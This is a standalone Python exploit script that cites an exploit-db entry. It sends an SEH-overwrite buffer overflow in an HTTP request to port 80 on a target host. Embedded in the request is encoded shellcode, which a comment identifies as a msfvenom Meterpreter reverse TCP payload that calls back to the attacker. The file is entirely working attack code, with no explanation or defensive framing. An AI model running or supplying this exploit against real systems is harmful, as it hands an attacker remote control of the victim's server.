#!/usr/bin/python
# https://www.exploit-db.com/exploits/24897
import socket, sys
from struct import pack

host = sys.argv[1]
port = 80
size = 2000

 #msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your ip] LPORT=[your port] -b "\x00\x0d\x20\x2f" -f python -v shellcode

shellcode = b"\x90" * 20
shellcode +=  b""
shellcode += b"\xdd\xc0\xd9\x74\x24\xf4\x5f\xba\xaa\x04\x87"
shellcode += b"\x5b\x31\xc9\xb1\x59\x31\x57\x19\x03\x57\x19"
shellcode += b"\x83\xef\xfc\x48\xf1\x7b\xb3\x03\xfa\x83\x44"
shellcode += b"\x7b\x72\x66\x75\xa9\xe0\xe2\x24\x7d\x62\xa6"
shellcode += b"\xc4\xf6\x26\x53\xda\xbf\x8d\x7d\xd5\x40\x9a"
shellcode += b"\xf0\x3d\x8f\x5d\x58\x01\x8e\x21\xa3\x56\x70"
shellcode += b"\x1b\x6c\xab\x71\x5c\x3a\xc1\x9e\x30\x36\x7b"
shellcode += b"\x70\x3e\x0a\x40\x27\x41\x5b\x33\x87\x39\xde"
shellcode += b"\x84\x73\xf6\xe1\xd4\x2b\x8d\xba\xf4\x40\xd9"
shellcode += b"\x22\xf4\x85\x5f\x9b\x82\x15\x51\xe3\x22\xee"
shellcode += b"\xa5\x90\xb4\x26\xf4\x66\x77\x09\xfa\xca\x79"
shellcode += b"\x52\x3d\xf3\x0f\xa8\x3d\x8e\x17\x6b\x3f\x54"
shellcode += b"\x9d\x6b\xe7\x1f\x05\x4f\x19\xf3\xd0\x04\x15"
shellcode += b"\xb8\x97\x42\x3a\x3f\x7b\xf9\x46\xb4\x7a\x2d"
shellcode += b"\xcf\x8e\x58\xe9\x8b\x55\xc0\xa8\x71\x3b\xfd"
shellcode += b"\xaa\xde\xe4\x5b\xa1\xcd\xf3\xdc\x4a\x0e\xfc"
shellcode += b"\x80\xdc\xc2\x31\x3b\x1c\x4d\x41\x48\x2e\xd2"
shellcode += b"\xf9\xc6\x02\x9b\x27\x10\x13\x8b\xd7\xce\x9b"
shellcode += b"\xdc\x29\xef\xdb\xf5\xed\xbb\x8b\x6d\xc7\xc3"
shellcode += b"\x40\x6e\xe8\x11\xfc\x64\x7e\x5a\xa8\x6a\xfe"
shellcode += b"\x32\xaa\x8c\xff\x79\x23\x6a\xaf\x2d\x63\x23"
shellcode += b"\x10\x9e\xc3\x93\xf8\xf4\xcc\xcc\x19\xf7\x07"
shellcode += b"\x65\xb3\x18\xf1\xdd\x2c\x80\x58\x95\xcd\x4d"
shellcode += b"\x77\xd3\xce\xc6\x7d\x23\x80\x2e\xf4\x37\xf5"
shellcode += b"\x48\xf6\xc7\x06\xfd\xf6\xad\x02\x57\xa1\x59"
shellcode += b"\x09\x8e\x85\xc5\xf2\xe5\x96\x02\x0c\x78\xae"
shellcode += b"\x79\x3b\xee\x8e\x15\x44\xfe\x0e\xe6\x12\x94"
shellcode += b"\x0e\x8e\xc2\xcc\x5d\xab\x0c\xd9\xf2\x60\x99"
shellcode += b"\xe2\xa2\xd5\x0a\x8b\x48\x03\x7c\x14\xb3\x66"
shellcode += b"\xfe\x53\x4b\xf4\x29\xfc\x23\x06\x6a\xfc\xb3"
shellcode += b"\x6c\x6a\xac\xdb\x7b\x45\x43\x2b\x83\x4c\x0c"
shellcode += b"\x23\x0e\x01\xfe\xd2\x0f\x08\x5e\x4a\x0f\xbf"
shellcode += b"\x7b\x7d\x6a\xb0\x7c\x7e\x8b\xd8\x18\x7f\x8b"
shellcode += b"\xe4\x1e\xbc\x5d\xdd\x54\x83\x5d\x5a\x66\xb6"
shellcode += b"\xc0\xcb\xed\xb8\x57\x0b\x24"


buffer = b"\x41" * (1271 - len(shellcode))
buffer += shellcode
buffer += pack("<L", (0x06eb9090))  #(NSEH)
buffer += pack("<L", (0x10020461))  #(SEH) PPR
buffer += b"\x90" * 4
buffer += b"\x66\x81\xc4\x6c\x10"   #add sp,106c
buffer += b"\xff\xe4"               #jmp esp
buffer += b"\x90" * (size - len(buffer))


request  = buffer + b" / HTTP/1.0\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(request)
s.close()
